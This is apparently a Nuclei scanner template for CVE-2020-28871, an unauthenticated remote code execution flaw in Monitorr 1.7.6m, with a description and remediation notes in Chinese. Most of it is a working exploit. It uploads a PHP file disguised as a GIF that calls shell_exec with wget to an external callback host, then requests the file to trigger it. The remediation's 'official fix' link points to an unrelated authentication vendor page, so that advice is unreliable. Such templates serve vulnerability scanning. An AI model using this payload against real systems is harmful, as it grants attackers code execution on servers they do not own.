id: CVE-2020-28871
info:
  name: Monitorr 1.7.6m - Unauthenticated Remote Code Execution
  author:
  - gy741
  description: "Monitorr 代码执行漏洞 \nMonitorr中存在代码问题漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。 "
  severity: critical
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁。
    https://deepnetsecurity.com/multi-factor-authentication/

    临时修复方案：<br />1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br />2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  raw:
  - |
    POST /assets/php/upload.php HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept: text/plain, */*; q=0.01
    Connection: close
    Accept-Language: en-US,en;q=0.5
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
    Origin: http://{{Hostname}}
    Referer: http://{{Hostname}}

    -----------------------------31046105003900160576454225745
    Content-Disposition: form-data; name="fileToUpload"; filename="{{randstr}}.php"
    Content-Type: image/gif

    GIF89a213213123<?php shell_exec("wget -c http://{{interactsh-url}}");

    -----------------------------31046105003900160576454225745--
  - |
    GET /assets/data/usrimg/{{tolower("{{randstr}}.php")}} HTTP/1.1
    Host: {{Hostname}}
